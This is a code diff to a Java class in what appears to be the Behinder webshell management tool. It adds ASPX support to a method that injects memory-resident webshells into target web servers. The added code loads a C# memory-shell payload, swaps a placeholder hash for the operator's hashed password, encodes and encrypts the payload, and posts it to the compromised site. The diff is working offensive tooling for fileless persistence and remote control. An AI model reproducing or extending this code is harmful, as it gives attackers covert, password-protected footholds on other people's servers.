@@ -1153,11 +1153,18 @@ public class ShellService {
 
     public JSONObject injectMemoryShell(String webEnv, String shellType, String urlPattern, String password) throws Exception {
         Map<String, String> params = new LinkedHashMap<>();
-        params.put("password", Utils.getMD5(password));
-        params.put("shellString", new String(Params.getParamedClass("memoryshell."+shellType, params), StandardCharsets.ISO_8859_1));
         params.put("urlPattern", urlPattern);
+        byte[] data = null;
+        if (this.currentType.equals("jsp")) {
+            params.put("password", Utils.getMD5(password));
+            params.put("shellString", new String(Params.getParamedClass("memoryshell."+shellType, params), StandardCharsets.ISO_8859_1));
+            data = Utils.getData(this.currentKey, this.encryptType, "memoryshell."+webEnv, params, this.currentType);
+        } else if (this.currentType.equals("aspx")) {
+            String s = new String(Utils.getResourceData(String.format("net/rebeyond/behinder/payload/csharp/memoryshell/%s.aspx", shellType)), StandardCharsets.ISO_8859_1);
+            params.put("shellString", Base64.encode(s.replace("e45e329feb5d925b",Utils.getMD5(password)).getBytes(StandardCharsets.ISO_8859_1)));
+            data = Utils.getData(this.currentKey, this.encryptType, "memoryshell/"+webEnv, params, this.currentType);
+        }
 
-        byte[] data = Utils.getData(this.currentKey, this.encryptType, "memoryshell."+webEnv, params, this.currentType);
         Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
         byte[] resData = (byte[])resultObj.get("data");
         String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
